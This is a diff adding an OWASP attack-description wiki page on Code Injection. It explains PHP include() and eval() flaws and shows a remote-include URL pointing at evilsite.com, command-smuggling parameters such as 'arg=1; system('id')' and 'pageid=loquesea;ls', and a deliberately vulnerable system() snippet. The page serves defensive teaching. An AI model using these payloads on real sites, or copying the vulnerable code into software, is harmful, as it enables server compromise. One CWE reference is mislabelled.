@@ -1,0 +1,104 @@
+{{Template:Attack}}
+<br>
+[[Category:OWASP ASDR Project]]
+
+Last revision (mm/dd/yy): '''{{REVISIONMONTH}}/{{REVISIONDAY}}/{{REVISIONYEAR}}'''
+
+==Description==
+Code Injection is the general name for a lot of types of attacks which depend on inserting code, which is interprated by the application. Such an attack may be be performed by adding strings of characters into a cookie or argument values in the URI. This attack makes use of lack of accurate input/output data validation, for example:
+
+* class of allowed characters (standard regular expressions classes or custom)
+* data format
+* amount of expected data
+* for numerical input, its values
+
+Code Injection and [[Command Injection]] are measures used to achive simmilar goals. The concept of Code Injection is to add malicious code into an application, which then will be executed. Added code is a part of the application itself. It's not external code which is executed, like it would be in Command Injection.
+
+<!--==Risk Factors==
+TBD
+-->
+==Examples ==
+
+'''Example 1'''
+
+If a site uses the include() function, which operates on variables sent with the GET method, and there is no validation performed on them, then the attacker may try to execute different code other than the author of the code had in mind.
+
+The URL below displays information about how to contact with the testsite company.
+
+http://testsite.com/index.php?page=contact.php
+
+Below the altered code is code from http://evilsite.com/evilcode.php. The script "evilcode.php" may contain, for example, a phpinfo() function, which is useful for gaining information about the configuration of the environment in which the web service runs.
+
+http://testsite.com/?page=http://evilsite.com/evilcode.php
+
+One condition must be satisfied for this example to be successful, namely the web server configuration must allow for including files in the "http://" notation.
+
+
+'''Example 2'''
+
+When a programmer uses the eval() function and operates on the data inside it, and these data may be altered by the attacker, then it's only one step closer to Code Injection.
+
+The example below shows how to use the eval() function:
+
+<pre>
+$myvar = "varname";
+$x = $_GET['arg'];
+eval("\$myvar = \$x;");
+</pre>
+
+The code above which smells like a rose may be used to perform a Code Injection attack.
+
+Example: passing in the URI /index.php?arg=1; phpinfo()
+
+While exploiting bugs like these, the attacker doesn't have to limit himself only to a Code Injection attack. The attacker may tempt himself to use Command Injection technique, for example.
+
+<pre>
+/index.pho?arg=1; system('id')
+</pre>
+
+'''Example 3'''
+
+<pre>
+<?php
+$varerror = system('cat '.$_GET['pageid'], $valoretorno);
+echo $varerror;
+?>
+</pre>
+
+by using that kind of code we can attak as show in example number 2
+
+using live http headers or using method get you can make this kind of petition:
+
+<pre>
+vulnerable.php?pageid=loquesea;ls
+</pre>
+
+ls is the command we are executing but we can use any other commands of the server.
+
+<!--==Related [[Threat Agents]]==
+TBD
+-->
+
+==Related [[Attacks]]==
+* [[Command Injection]]
+* [[SQL Injection]]
+* [[LDAP injection]]
+* [[Server-Side_Includes_%28SSI%29_Injection|SSI injection]]
+* [[Cross-site Scripting (XSS)]]
+
+==Related [[Vulnerabilities]]==
+* [[:Category: Input Validation Vulnerability]]
+
+==Related [[Controls]]==
+* [[Input Validation]]
+* [[Output Validation]]
+* [[Canonicalization]]
+
+==References==
+* [http://cwe.mitre.org/data/definitions/77.html CWE-77: Command Injection]
+* [http://cwe.mitre.org/data/definitions/78.html CWE-78: OS Command Injection]
+* [http://cwe.mitre.org/data/definitions/77.html CWE-89: SQL Injection]
+
+[[Category:Injection]]
+[[Category:Attack]]
+[[Category:Injection Attack]]
